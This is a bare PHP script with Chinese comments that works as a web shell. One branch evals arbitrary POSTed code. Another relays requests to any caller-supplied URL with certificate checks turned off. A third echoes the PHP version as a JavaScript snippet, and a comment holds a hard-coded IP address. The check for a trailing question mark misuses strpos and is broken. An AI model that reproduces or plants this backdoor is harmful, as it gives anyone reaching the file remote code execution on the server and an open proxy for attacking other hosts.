<?php

switch ($_REQUEST['type'] ?? '') {
	case 'run':
		echo eval(substr($_POST['code'], 6));
		break;
	case 'version':
		echo "document.write('" . PHP_VERSION . "');";
		break;
	case 'curl':
		$data = $_POST;
		$url = $data['url'];
		$is_post = $data['request_type'] == 'POST';
		unset($data['url'], $data['request_type']);
		$res = curl($url, $data, $is_post);
		echo $res;
		break;
	default:
		echo "type error";
		break;
}

function curl($url, $post_data, $is_post) {
    $post_data = http_build_query($post_data);
    $re=curl_init();//实例化cURL   http://161.202.43.125/
    curl_setopt($re, CURLOPT_HEADER, 0);//0关闭打印相应头,直接打印需为1,
    curl_setopt($re, CURLOPT_RETURNTRANSFER, 1);//0获取后直接打印出来 
    curl_setopt($re, CURLOPT_TIMEOUT,100);   //只需要设置一个秒的数量就可以  
	curl_setopt($re, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
	curl_setopt($re, CURLOPT_SSL_VERIFYHOST, FALSE);
    if ($is_post) {
        curl_setopt($re, CURLOPT_URL, $url);//初始化路径
        curl_setopt($re, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($re, CURLOPT_POST, 1);//启用时会发送一个常规的POST请求，
        curl_setopt($re, CURLOPT_POSTFIELDS, $post_data);//使用HTTP协议中的"POST"操作来发送的数据
    }
    else {
		if (strpos($url, -1) != '?') {
			$url .= '?';
		}
        curl_setopt($re, CURLOPT_URL, $url.$post_data);//初始化路径
        curl_setopt($re, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    }
    return curl_exec($re);//执行一个cURL会话,返回响应结果
}
